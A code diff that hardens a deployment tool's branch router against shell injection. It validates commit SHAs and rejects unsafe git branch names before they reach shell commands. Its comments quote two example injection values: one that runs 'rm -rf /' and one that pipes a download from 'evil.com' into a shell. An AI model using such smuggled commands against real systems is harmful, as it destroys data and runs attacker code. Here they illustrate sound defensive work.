@@ -21,6 +21,7 @@ import { detectStack } from '../services/stack-detector.js';
 import { assertProjectAccess } from './projects.js';
 import { CheckRunRunner } from '../services/check-run-runner.js';
 import { GitHubAppClient } from '../services/github-app-client.js';
+import { isSafeGitRef } from '../services/github-webhook-dispatcher.js';
 
 /**
  * P4 Part 18 (hardening): pre-restart sanity check for self-update.
@@ -1024,11 +1025,20 @@ export function createBranchRouter(deps: RouterDeps): Router {
       entry.status = 'building';
 
       // ── GitHub Checks integration ──
-      // If the branch was pushed by a webhook we stored the triggering
-      // commit SHA on it. When the deploy is triggered by the UI (no
-      // SHA yet) fall back to the current worktree HEAD so every deploy
-      // that links to a GitHub repo produces a check run.
-      if (entry.githubRepoFullName && !entry.githubCommitSha) {
+      // Priority for the commit SHA fed to the check run:
+      //   1. req.body.commitSha — the authoritative value from the
+      //      webhook-originated dispatcher, pinned at webhook-handling
+      //      time so concurrent pushes can't race it
+      //   2. entry.githubCommitSha — stored on the branch by the push
+      //      handler (same value in the normal flow)
+      //   3. current worktree HEAD — fallback for UI-triggered deploys
+      // If none of the above resolve, the check-run path is a no-op.
+      const bodyCommitSha = typeof req.body?.commitSha === 'string'
+        && /^[0-9a-f]{7,40}$/i.test(req.body.commitSha)
+        ? req.body.commitSha : undefined;
+      if (bodyCommitSha) {
+        entry.githubCommitSha = bodyCommitSha;
+      } else if (entry.githubRepoFullName && !entry.githubCommitSha) {
         try {
           const sha = await shell.exec('git rev-parse HEAD', { cwd: entry.worktreePath });
           if (sha.exitCode === 0) {
@@ -5416,6 +5426,17 @@ cdscli project list --human
 
       // Step 2: switch branch if specified
       if (branch) {
+        // Defense-in-depth: even though /api/self-update sits behind
+        // cookie/AI-key auth, an authenticated user supplying
+        // `branch='main; rm -rf /'` would otherwise run arbitrary
+        // commands. Reject shell-unsafe refs before they reach
+        // `shell.exec()`.
+        if (!isSafeGitRef(branch)) {
+          send('checkout', 'error', `拒绝不安全分支名: ${branch.slice(0, 80)}`);
+          sendSSE(res, 'error', { message: `不合法的分支名: ${branch}` });
+          res.end();
+          return;
+        }
         send('checkout', 'running', `正在切换到分支 ${branch}...`);
         // Use -f to discard tracked-file changes (safe: untracked files like .cds/state.json are untouched)
         const checkoutResult = await shell.exec(`git checkout -f ${branch}`, { cwd: repoRoot });
@@ -5460,6 +5481,15 @@ cdscli project list --human
       // still use `git reflog` to recover.
       send('pull', 'running', '正在硬对齐到远端最新...');
       const targetBranch = branch || (await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot })).stdout.trim();
+      // Guard the fallback branch too — a corrupted HEAD state could
+      // theoretically return something shell-unsafe (unlikely but the
+      // check costs nothing).
+      if (!isSafeGitRef(targetBranch)) {
+        send('pull', 'error', `拒绝不安全分支名: ${targetBranch.slice(0, 80)}`);
+        sendSSE(res, 'error', { message: `不合法的 target branch: ${targetBranch}` });
+        res.end();
+        return;
+      }
       const resetResult = await shell.exec(
         `git reset --hard origin/${targetBranch}`,
         { cwd: repoRoot },
@@ -5638,11 +5668,20 @@ cdscli project list --human
       }
       send('fetch', 'done', '远端 ref 已同步');
 
-      // Step 2: resolve target branch (use current if not supplied)
+      // Step 2: resolve target branch (use current if not supplied).
+      // Reject shell-unsafe refs up front — the endpoint is auth-gated
+      // but defense-in-depth against an attacker with a valid AI key
+      // crafting `branch='main; curl evil.com | sh'` is cheap.
       let target = branch;
       if (!target) {
         const cur = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot });
         target = cur.stdout.trim() || 'main';
+      }
+      if (!isSafeGitRef(target)) {
+        send('resolve', 'error', `拒绝不安全分支名: ${target.slice(0, 80)}`);
+        sendSSE(res, 'error', { message: `不合法的 branch: ${target}` });
+        res.end();
+        return;
       }
       send('resolve', 'done', '目标分支: ' + target);
 
